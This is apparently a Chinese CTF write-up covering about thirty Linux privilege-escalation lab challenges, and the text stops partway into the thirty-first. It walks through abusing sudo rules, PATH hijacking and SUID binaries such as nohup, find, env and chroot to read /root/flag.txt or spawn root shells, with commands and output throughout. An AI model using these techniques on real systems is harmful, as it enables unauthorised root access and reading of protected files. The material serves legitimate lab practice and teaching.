---
title: 好靶场-提权 WP
date: 2026-08-07
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/haobachang-tiquan-wp
recommend: 94
---

# # 1. 最简单的提权
**描述:**  index.php是一个post一句话木马，密码是a。你需要将用户权限从www 提升至 root 。flag在/root/flag.txt
既然是一句话木马，我们就可以使用蚁剑来连接一下，连接上后我们可以打开蚁剑自带的虚拟终端
![](/images/20260724093005.webp)
我们先查看一下我们当前的身份`whoami`，然后再看看我们的权限`sudo -l`
![](/images/20260724093605.webp)
这里我们得到了一个**关键信息：** `(ALL) NOPASSWD: /bin/su`
这行配置的意思是：**你可以无需密码，以 root 身份执行 `/bin/su` 命令**。那就很爽了，我们直接`echo '' | sudo -S /bin/su -c 'cat /root/flag.txt'`就可以拿到flag了
![](/images/20260724094922.webp)
**解释：`echo '' | sudo -S /bin/su -c 'cat /root/flag.txt'`** 因为 `sudo` 只给 `/bin/su` 开了免密"后门"，所以我们先通过 `sudo -S` 免密进入 `/bin/su`（绕过终端限制），再用 `/bin/su` 的 root 权限去执行 `cat`，最终读到 flag。
# 2. 一个不存在的文件居然也可以提权
**描述:**  index.php是一个post一句话木马，密码是a。你需要将用户权限从www 提升至 root 。flag在/root/flag.txt
既然是一句话木马，我们就可以使用蚁剑来连接一下，连接上后我们可以打开蚁剑自带的虚拟终端
![](/images/20260724095412.webp)
我们直接查看一下我们有哪些权限`sudo -l`
![](/images/20260724095532.webp)
**关键信息：** NOPASSWD：/var/www/html/haobachang.html 说明可以无密码执行 `/var/www/html/haobachang.html`
接下来我们可以先看一下`/var/www/html/haobachang.html`，执行`cat /var/www/html/haobachang.html`
![](/images/20260724100121.webp)
既然没有这个文件，但是sudo允许www-data以root权限执行它，所以我们可以创建一个文件并且执行他
```
# 创建haobachang.html文件
echo '#!/bin/bash' > haobachang.html # 创建脚本文件的第一行，使其成为可执行的bash脚本。
echo 'cat /root/flag.txt' >> haobachang.html # 在脚本第二行添加读取flag的命令，这样执行脚本时会显示flag内容。
# 给予执行权限
chmod +x haobachang.html
# 以root权限执行
sudo /var/www/html/haobachang.html
```
![](/images/20260724100452.webp)
这样，我们就成功拿下flag啦！！！
# 3. 命令劫持
![](/images/20260724121655.webp)
老样子，我们依然先看看我们的身份`whoami`--------www-data
在看看我们的权限`sudo -l`
```
Matching Defaults entries for www-data on ec569f93b77d: env_reset, mail_badpass, use_pty User www-data may run the following commands on ec569f93b77d: (root) NOPASSWD: /var/start.sh
```
**解读：** 
www-data用户可以不用密码，以root权限执行 `/var/start.sh` 这个脚本

| NOPASSWD      | 不需要输入密码    |
| ------------- | ---------- |
| /var/start.sh | 只能执行这个特定文件 |
接下来让我们看一下文件是否存在及权限
`ls -la /var/start.sh`
输出
```
-rwxr-xr-x 1 root root 23 Nov 22 2025 /var/start.sh
```
既然存在，那我们就看一下这个脚本里面的内容`cat /var/start.sh`
输出
```
-e #!/bin/bash 
ls /etc
```
说明这个脚本可以执行`ls /etc`这个命令，这意味着系统会从 `PATH` 环境变量中搜索 `ls` 命令，所以我们可以利用 **PATH劫持** 技术来获取flag
我们查看一下环境`echo $PATH`
输出
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
我们再检查一下可写的目录`ls -la /tmp/`注：我们需要一个可写目录来存放恶意脚本，`/tmp/` 是理想的选择
创建恶意脚本
```
echo "cat /root/flag.txt" > /tmp/ls # 在/tmp/目录中创建一个ls的脚本

chmod 777 /tmp/ls # 确保所有用户都有读、写、执行权限

sudo PATH=/tmp:$PATH /var/start.sh # 以root身份执行/var/start.sh
```
![](/images/20260724155132.webp)
这样我们就拿到flag啦！！！
# 4. 提权碎片2
![](/images/20260724155624.webp)
我们先查看当前用户`whoami`
输出
```
newuser
```
再看看有什么权限`sudo -l`
输出
```
bash: sudo: command not found
```
说明没有安装sudo的命令，我们继续探测其他的命令，我们先查找SUID文件
`find / -perm -4000 -type f 2>/dev/null`
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/od 
/usr/bin/passwd
```
发现了关键信息：`/usr/bin/od ` **od：** 是一个用于查看文件内容的工具，通常用于查看二进制文件或非文本文件
于是我们直接用这个来直接读取flag，`/usr/bin/od -An -t c /root/flag.txt`
输出
```
newuser@5c832426ab73:/$ /usr/bin/od -An -t c /root/flag.txt
   f   l   a   g   {   4   e   c   4   d   d   b   8   1   e   b
   2   4   e   8   4   b   9   1   c   7   8   8   c   c   0   7
   7   9   a   7   3   }  \n
```
就拿到flag啦！！！
# 5. php提权
**描述:**  index.php是一个post一句话木马，密码是a。你需要将用户权限从www 提升至 root 。flag在/root/flag.txt
既然是一句话木马，我们就可以使用蚁剑来连接一下，连接上后我们可以打开蚁剑自带的虚拟终端
![](/images/20260724192600.webp)
我们先看一下我们的身份`whoami`------------------------------------www-data
再看看权限`sudo -l`
输出
```
Matching Defaults entries for www-data on bcfa4b0a9aa8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
User www-data may run the following commands on bcfa4b0a9aa8:
    (root) NOPASSWD: /usr/local/bin/php
```
**解读：** 
www-data用户可以不用密码，以root权限执行 `/usr/local/bin/php` 该php文件
既然这样，我们可以使用`sudo /usr/local/bin/php -r &quot;system(&#x27;cat /root/flag.txt&#x27;);&quot;` 来执行php代码，来读取flag，竟然读取失败了？？？
![](/images/20260724194129.webp)
按理说可以正常读取的，换种方式`sudo /usr/local/bin/php -r "system(\"cat /root/flag.txt\");"`依旧读取失败
```
(www-data:/bin/sh: 1) $ sudo /usr/local/bin/php -r "system(\"cat /root/flag.txt\");"
ret=2
```
换其他函数继续读取
```

sudo /usr/local/bin/php -r "echo shell_exec('cat /root/flag.txt');"

sudo /usr/local/bin/php -r "passthru('cat /root/flag.txt');"

echo "<?php echo file_get_contents('/root/flag.txt'); ?>" | sudo /usr/local/bin/php

```
奇怪的是都没有输出flag，难道是思路错了？？？
![](/images/20260724194942.webp)
于是我们检查一下php的配置问题
```
#检查 PHP 是否正常执行
sudo /usr/local/bin/php -v
sudo /usr/local/bin/php -r "echo 'test';"

#检查 PHP 配置和错误信息
sudo /usr/local/bin/php -i | grep -i error
```
![](/images/20260724195245.webp)
原来是这个系统被配置为在执行命令后自动添加额外的命令。从图中输出中可以看到，系统在执行我们的命令后自动添加了 ;echo 和 ;pwd;echo 等后缀。**そういうことか** 我们可以使用base64编码绕过这个限制
```
echo "c3VkbyAvdXNyL2xvY2FsL2Jpbi9waHAgLXIgInN5c3RlbSgnY2F0IC9yb290L2ZsYWcudHh0Jyk7Igo=" | base64 -d | bash
```
![](/images/20260724200143.webp)
就拿到flag啦！！！
# 6. 提权碎片3
![](/images/20260725092000.webp)
打开题目，迎接我们的是一个 **GoTTY 网页终端**，直接以 `newuser` 用户登录，flag 在 `/root/flag.txt`

我们先查看一下当前的身份和系统信息
```
id && uname -a
```
![](/images/20260725092100.webp)
输出：
```
uid=1000(newuser) gid=1000(newuser) groups=1000(newuser)
Linux 413e4f1089da 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 20 00:40:06 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
**分析：** 我们是普通用户 `newuser`，内核版本 `6.8.0-31` 比较新，内核漏洞利用基本排除

接下来按照提权标准流程，先查找 **SUID 文件**（这是最常见的提权向量之一）
```
find / -perm -4000 -type f 2>/dev/null
```
![](/images/20260725092200.webp)
输出：
```
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/nohup
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
```
**关键发现：** 除了系统自带的 SUID 程序外，出现了一个不太常见的 `/usr/bin/nohup`！

`nohup` 正常情况下**不应该有 SUID 位**，这很可能就是出题人留下的后门。我们验证一下权限
```
ls -la /usr/bin/nohup
```
![](/images/20260725092300.webp)
输出：
```
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/nohup
```
**确认：** `-rwsr-xr-x` 中的 `s` 就是 SUID 位，说明 `nohup` 会以 **root 权限**运行

**提权原理：** `nohup` 会执行任意命令且忽略 SIGHUP 信号，当它带有 SUID 位时，我们可以用它来以 root 身份启动一个 shell。配合 `bash -p` 中的 `-p` 参数（保留有效用户 ID），就能维持 root 权限

接下来直接利用：
```
nohup /bin/bash -p -c "id; cat /root/flag*; ls -la /root/" > /tmp/flag_out.txt 2>&1 &
```
![](/images/20260725092400.webp)
输出：
```
uid=1000(newuser) gid=1000(newuser) euid=0(root) groups=1000(newuser)
flag{64bfa26cac484bcb9dd9e01df9efd701}
total 20
drwx------ 1 root root 4096 Jul 25 01:12 .
drwxr-xr-x 1 root root 4096 Jul 25 01:12 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw-r--r-- 1 root root   39 Jul 25 01:12 flag.txt
```
**解读：**
- `euid=0(root)` 确认我们获得了 **root 的有效用户 ID**
- `flag{64bfa26cac484bcb9dd9e01df9efd701}` 就是 flag！

**解释：** `nohup` 因为 SUID 位而以 root 身份运行，`/bin/bash -p` 中的 `-p` 参数让 bash 不丢弃特权，保持 euid=0，从而以 root 权限执行了我们传入的 `cat /root/flag*` 命令

就这样拿到flag啦！！！
**注：**
```
newuser@413e4f1089da:/$ /usr/bin/nohup cat /root/flag.txt > /tmp/flag.txt ；cat /tmp/flag.txt
输出
/usr/bin/nohup: ignoring input and redirecting stderr to stdout
flag{64bfa26cac484bcb9dd9e01df9efd701}
```
也可以哦！！！

# 7. 提权碎片4
![](/images/20260725094727.webp)
打开题目，迎接我们的是一个 **GoTTY 网页终端**，直接以 `newuser` 用户登录，flag 在 `/root/flag.txt`
我们先查看一下当前的身份和系统信息
```
id && uname -a
```
![](/images/20260725094828.webp)
让我们来看一下我们的权限`sudo -l`-----------结果发现系统没有sudo这个命令
接下来我们看一下SUID 文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
newuser@f8972476f0f1:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/nl
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
```
**关键发现：** 除了系统自带的 SUID 程序外，出现了一个不太常见的 `/usr/bin/nl`！

`nl` 正常情况下**不应该有 SUID 位**，这很可能就是出题人留下的后门。我们验证一下权限
```
ls -la /usr/bin/nl
```
输出
```
-rwsr-xr-x 1 root root 43448 Sep  5  2019 /usr/bin/nl
```
我们直接利用`/usr/bin/nl /root/flag.txt`来读取flag

输出
```
newuser@f8972476f0f1:/$ /usr/bin/nl /root/flag.txt                 1  flag{5327ab717a77412ea5acd81fee5df8ee}
```
就拿到flag啦！！！
# 8. 提权碎片5
![](/images/20260725094727.webp)
打开题目，迎接我们的是一个 **GoTTY 网页终端**，直接以 `newuser` 用户登录，flag 在 `/root/flag.txt`
我们先查看一下当前的身份和系统信息
```
id && uname -a
```
![](/images/20260725100618.webp)
让我们来看一下我们的权限`sudo -l`-----------结果发现系统没有sudo这个命令
接下来我们看一下SUID 文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
newuser@f8972476f0f1:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/nice
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
```
**关键发现：** 除了系统自带的 SUID 程序外，出现了一个不太常见的 `/usr/bin/nice`！

`nice` 正常情况下**不应该有 SUID 位**，这很可能就是出题人留下的后门。我们验证一下权限
```
ls -la /usr/bin/nice
```
输出
```
-rwsr-xr-x 1 root root 43448 Sep  5  2019 /usr/bin/nice
```
我们直接利用`/usr/bin/nice cat /root/flag.txt`来读取flag

输出
```
newuser@30ca01ac16cd:/$ /usr/bin/nice cat /root/flag.txt
flag{eff02e89351e494b89647116b6c8ecc9}
```
就拿到flag啦！！！
# 9. 提权碎片6
![](/images/20260725094727.webp)
打开题目，迎接我们的是一个 **GoTTY 网页终端**，直接以 `newuser` 用户登录，flag 在 `/root/flag.txt`
我们先查看一下当前的身份和系统信息
```
id && uname -a
```
![](/images/20260725102517.webp)
让我们来看一下我们的权限`sudo -l`-----------结果发现系统没有sudo这个命令
接下来我们看一下SUID 文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
newuser@f8972476f0f1:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/xz
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
```
**关键发现：** 除了系统自带的 SUID 程序外，出现了一个不太常见的 `/usr/bin/xz`！
`xz` 是一个**压缩/解压缩工具**，类似于 `gzip`、`zip`
**有SUID意味着**：可以以root权限运行，可以**读取和压缩任何文件**！
`xz` 正常情况下**不应该有 SUID 位**，这很可能就是出题人留下的后门。我们验证一下权限
```
ls -la /usr/bin/xz
```
输出
```
-rwsr-xr-x 1 root root 80384 Apr  8  2022 /usr/bin/xz
```
我们直接利用`/usr/bin/xz /root/flag.txt`来将flag压缩再用`/usr/bin/xz -dc /root/flag.txt.xz`来读取flag
输出
```
newuser@c78023b0df86:/$ /usr/bin/xz -dc /root/flag.txt.xz          flag{7840f60ed89c4d7785ee77d859ac3d1f}
```
注：-dc是**解压文件并显示内容** 是`-d` (decompress) - 解压模式和`-c` (stdout) - 输出到屏幕的缩写
# 10. 提权碎片7
其他操作和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/mv 
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/mv`
**`mv`** 是Linux的**移动/重命名**命令。
有SUID意味着：**以root权限移动/重命名任何文件**！
先将`/root/flag.txt`移动到`/tmp/flag.txt`下，再查看flag.txt
输入
```
/usr/bin/mv /root/flag.txt /tmp/flag.txt;cat /tmp/flag.txt
```
就能拿到flag啦！！！
# 11. 提权碎片8
和前面一样，查看SUID文件

```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/more
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/more`
**`more`** 是Linux的**分页查看器**，用于查看长文本文件（类似于 `less`）。
有SUID意味着：**以root权限查看任何文件**！
直接查看flag`/usr/bin/more /root/flag.txt`
就能拿到flag啦！！！
find / -perm -4000 -type f 2>/dev/null# 12. 提权碎片9
和前面一样，查看SUID文件
# 12. 提权碎片9

```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/mawk
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/mawk`
**`mawk`** 是Linux中的**AWK编程语言解释器**（AWK的一个版本），用于文本处理。
有SUID意味着：**以root权限运行AWK脚本**！
直接读取flag`/usr/bin/mawk '{print}' /root/flag.txt`
就能拿到flag
# 13. 提权碎片10
和前面一样，查看SUID文件

```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/sbin/logsave
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/sbin/logsave`
**`logsave`** 是一个用于**保存命令输出到日志文件**的工具，通常用于系统启动时记录日志。
有SUID意味着：**以root权限运行，可以读取/写入任何文件**！
直接读取flag`/usr/sbin/logsave /tmp/flag.txt cat /root/flag.txt;cat /tmp/flag.txt`
就拿到flag啦！！！
# 14. 提权碎片11
和前面一样，查看SUID文件

```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/join
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/join`
**`join`** 是一个用于**合并两个文件**的文本处理工具（类似于数据库的JOIN操作）。
有SUID意味着：**以root权限运行，可以读取任何文件**！
直接读取flag`join -a 2 /dev/null /root/flag.txt`
`-a 2：`输出第二个文件 `/dev/null：`第一个空文件 `/root/flag.txt：`第二个目标文件
就拿到flag啦！！！
# 15. 提权碎片12
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/ionice
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/ionice`
**`ionice`** 是一个用于**设置进程I/O优先级**的工具，可以控制程序对磁盘读写的优先级。
有SUID意味着：**以root权限运行，可以设置任何进程的I/O优先级**！
直接读取flag`/usr/bin/ionice -c 0 cat /root/flag.txt`
就拿到flag啦！！！
# 16. 提权碎片13
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/install
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/install`
**`install`** 是一个用于**复制文件并设置权限**的工具，通常用于Makefile中安装软件。
有SUID意味着：**以root权限复制和设置任何文件**！
直接读取flag`install -m 644 /root/flag.txt /tmp/flag.txt;cat /tmp/flag.txt` 意思就是将`/root/flag.txt`复制到`/tmp/flag.txt`然后读取flag `-m 644：`设置文件权限为 `644`（`rw-r--r--`）
就拿到flag啦！！！
# 17. 提权碎片14
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/iconv
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/iconv`
**`iconv`** 是一个用于**转换文件编码**的工具，比如将GBK转换为UTF-8。
有SUID意味着：**以root权限运行，可以读取任何文件**！
直接读取flag`/usr/bin/iconv -f UTF-8 -t UTF-8 /root/flag.txt`
iconv的一般格式：iconv -f 原编码 -t 目标编码 文件名
就拿到flag啦！！！
# 18. 提权碎片15
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/head
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/head`
**`head`** 是一个用于**显示文件开头内容**的命令（默认显示前10行）。
有SUID意味着：**以root权限运行，可以读取任何文件**！
直接读取flag`/usr/bin/head /root/flag.txt`
就拿到flag啦！！！
# 19. 提权碎片16
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/gzip
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/gzip`
**`gzip`** 是一个**压缩/解压缩**工具，类似于 `xz`。
有SUID意味着：**以root权限运行，可以读取和压缩任何文件**！
直接读取flag`gzip -c /root/flag.txt > /tmp/flag.gz;gunzip -c /tmp/flag.gz` 意思是先将/root/flag.txt压缩到/tmp/flag.gz再读取flag
或者`/usr/bin/gzip -c /root/flag.txt | gunzip -c`也可以读取flag
就拿到flag啦！！！
# 20. 提权碎片17
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/grep
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/grep`
**`grep`** 是一个强大的**文本搜索**工具，用于在文件中查找匹配的内容。
有SUID意味着：**以root权限运行，可以搜索任何文件**！
直接读取flag`grep -r "flag" /root/flag.txt`
就拿到flag啦！！！
# 21. 提权碎片18
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/flock
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/flock`
**`flock`** 是一个**文件锁管理**工具，用于给文件加锁，防止多个进程同时访问。
有SUID意味着：**以root权限运行**！
直接读取flag`/usr/bin/flock /tmp/lock cat /root/flag.txt` 
就拿到flag啦！！！
# 22. 提权碎片19
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/find
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/find`
**CTF提权中最经典、最强大的SUID程序：`/usr/bin/find`！**
这是SUID提权的"**王炸**"，因为它可以直接执行系统命令！
直接读取flag`/usr/bin/find /root -name flag.txt -exec cat {} \;`
就拿到flag啦！！！
# 23. 提权碎片20
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/env
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/env`
**`env`** 是一个用于**在修改后的环境中执行命令**的工具。
有SUID意味着：**以root权限运行，可以执行任何命令**！
直接读取flag`/usr/bin/env cat /root/flag.txt`
就拿到flag啦！！！
# 24. 提权碎片21
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/diff
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/diff`
**`diff`** 是一个用于**比较两个文件差异**的工具。
有SUID意味着：**以root权限运行，可以读取任何文件**！
直接读取flag`/usr/bin/diff /dev/null /root/flag.txt`
就拿到flag啦！！！
# 25. 提权碎片22
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/timeout
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/timeout`
**`timeout`** 是一个用于**在指定时间后终止命令**的工具。
有SUID意味着：**以root权限运行，可以执行任何命令**！
timeout格式：timeout 时间 命令
直接读取flag`timeout 1 cat /root/flag.txt`
就拿到flag啦！！！
# 26. 提权碎片23
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/date
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/date`
**`date`** 是一个用于**显示或设置系统日期和时间**的命令。
有SUID意味着：**以root权限运行**！
date格式：date --file 参数读取文件
直接读取flag`date --file=/root/flag.txt` 或者`date -f /root/flag.txt`
就拿到flag啦！！！
# 27. 提权碎片24
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/csplit
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/csplit`
**`csplit`** 是一个用于**根据指定模式分割文件**的工具（按行或正则表达式分割）。
有SUID意味着：**以root权限运行，可以读取任何文件**！
csplit格式：csplit 文件名 行号
直接读取flag`csplit /root/flag.txt 1`
输出
```
0 # 第一个文件（xx00）从第0行开始
39 # 第二个文件（xx01）从第39行开始
```
先看第一个文件`cat xx00`------------------------------------------------无回显
再看第二个文件`cat xx01` 
就拿到flag啦！！！
# 28. 提权碎片25
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/cmp
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/cmp`
**`cmp`** 是一个用于**比较两个文件**的工具（逐字节比较）。
有SUID意味着：**以root权限运行，可以读取任何文件**！
直接读取flag`cmp /root/flag.txt /dev/zero -b -l`
`/dev/zero：`一个无限输出 `\0` 的设备文件 `-b：`以八进制显示字节 `-l：`显示所有差异（verbose模式）
![](/images/20260725165238.webp)
就拿到flag啦！！！
# 29. 提权碎片26
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/sbin/chroot
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/chroot`
**`chroot`** 是一个用于**更改根目录**的命令，可以将当前进程的根目录切换到指定目录。
有SUID意味着：**以root权限运行**！
直接读取flag`chroot / /bin/cat /root/flag.txt`
或者`chroot / /bin/sh -p`拿权限
再`cat /root/flag.txt`
就拿到flag啦！！！
# 30. 提权碎片27
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/choom
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/choom`
**`choom`** 是一个用于**调整进程OOM（Out-Of-Memory）评分**的工具，可以设置进程在内存不足时被终止的优先级。
有SUID意味着：**以root权限运行**！
直接读取flag`choom -n 39 cat /root/flag.txt`
就拿到flag啦！！！
# 31. 提权碎片28
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/bzip2
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/bzip2`
**`bzip2`** 是一个**压缩/解压缩**工具，类似于 `gzip` 和 `xz`。
有SUID意味着：**以root权限运行，可以读取和压缩任何文件**！
直接读取flag`bzip2 -c /root/flag.txt > /tmp/flag.bz2;bunzip2 -c /tmp/flag.bz2`先压缩到/tmp/flag.bz2,再查看flag，或者`bzip2 -c /root/flag.txt | bunzip2 -c`
就拿到flag啦！！！
# 32. 提权碎片29
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/mawk
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/mawk`
**`mawk`** 是 AWK 编程语言的解释器，用于文本处理。
有SUID意味着：**以root权限运行，可以执行任意命令和读取任何文件**！
直接读取flag`/usr/bin/mawk '{print}' /root/flag.txt`
就拿到flag啦！！！
# 33. 提权碎片30
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/sbin/arp
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/sbin/arp`
**`arp`** 是一个用于**查看和管理ARP缓存**的网络工具，可以显示和修改IP地址到MAC地址的映射表。
有SUID意味着：**以root权限运行**！
直接读取flag`arp -v -f /root/flag.txt`
就拿到flag啦！！！
# 34. 提权碎片31
打开题目，迎接我们的是一个 **GoTTY 网页终端**，直接以 `newuser` 用户登录，flag 在 `/root/flag.txt`

我们先查看一下当前的身份和系统信息
```
id && uname -a
```
输出：
```
uid=1000(newuser) gid=1000(newuser) groups=1000(newuser)
Linux b25a7cb7fe0f 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 20 00:40:06 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
**分析：** 我们是普通用户 `newuser`，内核版本较新，内核漏洞利用基本排除

按照提权标准流程，先查找 **SUID 文件**
```
